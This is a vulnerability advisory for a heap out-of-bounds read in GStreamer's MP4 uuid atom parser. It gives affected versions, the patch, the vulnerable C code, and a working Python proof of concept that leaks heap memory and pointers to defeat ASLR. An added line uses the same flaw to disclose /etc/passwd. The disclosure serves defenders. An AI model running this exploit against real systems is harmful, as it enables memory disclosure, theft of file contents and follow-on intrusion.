# GStreamer - Heap Out-of-Bounds Read in qtdemux_parse_uuid

## Vendors

* GStreamer

## Affected Products

GStreamer gst-plugins-good < 1.28.1

## Summary

While parsing an MP4 file, the `isomp4` plugin's `qtdemux_parse_uuid` function may read past the end of a heap-allocated buffer, allowing an attacker to disclose heap memory contents.

## Remediation/Mitigation

This issue was patched in the gst-plugins-good 1.28.1 release. A [patch file](https://gitlab.freedesktop.org/gstreamer/gstreamer/-/merge_requests/10880.patch) is also available for older releases.

## Technical Details

The `isomp4` plugin's `qtdemux_parse_uuid` function may read past the end of a heap buffer when parsing the `uuid` atom of an MP4 file encrypted with PlayReady DRM. The affected code, shown below, does not validate the size of the atom before reading a two-byte integer (`len`) and a UTF-16 string field (`s_utf16`) at fixed positions (`offset + 0x30` and `offset + 0x32`, respectively) in the atom buffer.

After reading these fields, the code converts `s_utf16` to UTF-8, passing `len / 2` as the length to `g_utf16_to_utf8` (resulting in up to `len` bytes from the start of `s_utf16` being read). However, `len` is not first validated to ensure that `s_utf16 + len` is within the bounds of the atom buffer.

As a result of these missing checks, when the buffer size is less than `offset + 0x32` bytes, reading `len` overruns the buffer. When the buffer size is less than `offset + 0x32 + len` bytes, converting `s_utf16` to UTF-8 may also overrun the buffer.

`subprojects/gst-plugins-good/gst/isomp4/qtdemux.c`:

```c
static void
qtdemux_parse_uuid (GstQTDemux * qtdemux, const guint8 * buffer, gint length)
{
  // ...

  guint offset;

  /* counts as header data */
  qtdemux->header_size += length;

  offset = (QT_UINT32 (buffer) == 0) ? 16 : 8;

  if (length <= offset + 16) {
    GST_DEBUG_OBJECT (qtdemux, "uuid atom is too short, skipping");
    return;
  }

  if (memcmp (buffer + offset, xmp_uuid, 16) == 0) {
    // ...
  } else if (memcmp (buffer + offset, playready_uuid, 16) == 0) {
    int len;
    const gunichar2 *s_utf16;
    char *contents;

    len = GST_READ_UINT16_LE (buffer + offset + 0x30);
    s_utf16 = (const gunichar2 *) (buffer + offset + 0x32);
    contents = g_utf16_to_utf8 (s_utf16, len / 2, NULL, NULL, NULL);
    GST_ERROR_OBJECT (qtdemux, "contents: %s", contents);

    g_free (contents);

    GST_ELEMENT_ERROR (qtdemux, STREAM, DECRYPT,
        (_("Cannot play stream because it is encrypted with PlayReady DRM.")),
        (NULL));
  }
  // ...
```

The UTF-8 string (the `contents` variable) is subsequently logged to standard error via a call to `GST_ERROR_OBJECT`. An attacker with access to the GStreamer log output can convert this string back to UTF-16 to recover the original memory contents, which enables them to bypass address space layout randomization (ASLR), reveal the contents of other files loaded by the process, and possibly access other sensitive information in memory.

The proof-of-concept script below runs the `gst-discoverer-1.0` tool (with the debug level set to `ERROR`) on a crafted MP4 file that triggers the out-of-bounds read in `qtdemux_parse_uuid`. It then searches the program's standard error for the `contents:` debug statement and converts the logged contents to UTF-16 (their original representation in memory). The result contains a valid address (`0x7ffac800feff`), which can be used to bypass ASLR in additional exploits.

Note that this PoC is not 100% reliable. Its behavior depends on the data present in memory following the atom buffer, which determines the string length that `qtdemux_parse_uuid` reads and the contents of the logged data.

```python
#!/usr/bin/env python3

import subprocess
import os
import sys
import re

# Minimal MP4 file with uuid atom that causes out-of-bounds read
poc = b"\x00\x00\x00 uuid\xd0\x8aO\x18\x10\xf3J\x82\xb6\xc82\xd8\xab\xa1\x83\xd3\xfbwr AAAAS\x00"
gdb = []
#gdb = ["gdb", "-ex", "set disable-randomization off", "-ex", "run", "--args"]

# Run gst-discoverer-1.0 tool and extract leaked heap data from stderr
# uris: list of URIs to be discovered
def leak(uris=[]):
    result = subprocess.run(
        gdb + ["gst-discoverer-1.0"] + uris,
        env={**os.environ, "GST_DEBUG": "1"},
        capture_output=True,

        # Also send MP4 on stdin so that fd://0 is a usable URI
        input=poc,
    )
    
    if gdb:
        m = re.search(b"\\[Thread (0x\\w{12})", result.stdout, re.S)
        print('found thread address: ' + str(m.group(1)))
    
    m = re.search(rb"contents: (.+)\n", result.stderr, re.S)
    if m:
        contents = m.group(1)
        decoded = contents.decode("utf-8").encode("utf-16")
        print("decoded contents: " + str(decoded))

        # Might be a pointer
        if len(decoded) == 6:
            print("leaked address: " + hex(int.from_bytes(decoded, "little")))
    else:
        print("contents not found")


with open("/tmp/poc.mp4", "wb") as f:
    f.write(poc)

# Leak a valid address
leak(["/tmp/poc.mp4"])
```

Output:

```
decoded contents: b'\xff\xfe\x00\xc8\xfa\x7f'
leaked address: 0x7ffac800feff
```

Additionally, an attacker may be able to use this vulnerability to disclose the contents of files previously loaded by the process. For example, the command `gst-discoverer-1.0 /etc/passwd fd://0` first reads `/etc/passwd`, followed by `fd://0` (i.e., standard input). If the malicious MP4 file is provided on standard input, the out-of-bounds read discloses the contents of `/etc/passwd` during processing of `fd://0`. This scenario can be simulated by adding the following line to the PoC:

```python
# Leak the contents of the first discovered file (/etc/passwd)
leak(["/etc/passwd", "fd://0"])
```
